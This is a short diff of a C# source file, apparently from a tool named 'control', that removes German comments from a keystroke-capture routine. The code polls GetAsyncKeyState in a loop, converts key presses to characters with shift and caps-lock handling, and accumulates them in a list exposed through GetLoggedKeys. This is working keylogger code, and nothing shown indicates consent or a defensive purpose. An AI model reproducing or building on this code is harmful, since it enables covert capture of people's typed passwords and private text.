@@ -30,26 +30,26 @@ namespace control
                     if (GetAsyncKeyState(i) == -32767)
                     {
                         char key = GetCharFromVirtualKey(i);
-                        if (key != '\0') // Nur druckbare Zeichen hinzufügen
+                        if (key != '\0')
                         {
                             loggedKeys.Add(key);
                         }
                     }
                 }
-                Thread.Sleep(10); // Kleine Pause, um CPU zu schonen
+                Thread.Sleep(10);
             }
         }
 
         private static char GetCharFromVirtualKey(int virtualKey)
         {
-            uint scanCode = MapVirtualKey((uint)virtualKey, 0); // MAPVK_VK_TO_VSC
+            uint scanCode = MapVirtualKey((uint)virtualKey, 0); 
             byte[] keyState = new byte[256];
             StringBuilder buffer = new StringBuilder(10);
 
             // Setze Shift- und Caps-Zustand im keyState
-            if ((GetAsyncKeyState(0x10) & 0x8000) != 0) keyState[0x10] = 0x80; // Shift links
-            if ((GetAsyncKeyState(0xA0) & 0x8000) != 0) keyState[0xA0] = 0x80; // Shift rechts
-            if ((GetKeyState(0x14) & 0x0001) != 0) keyState[0x14] = 0x01; // Caps Lock
+            if ((GetAsyncKeyState(0x10) & 0x8000) != 0) keyState[0x10] = 0x80; 
+            if ((GetAsyncKeyState(0xA0) & 0x8000) != 0) keyState[0xA0] = 0x80; 
+            if ((GetKeyState(0x14) & 0x0001) != 0) keyState[0x14] = 0x01; 
 
             int result = ToUnicode((uint)virtualKey, scanCode, keyState, buffer, buffer.Capacity, 0);
 
@@ -58,7 +58,7 @@ namespace control
                 return buffer[0];
             }
 
-            return '\0'; // Kein Zeichen
+            return '\0'; 
         }
 
         public static List<char> GetLoggedKeys()
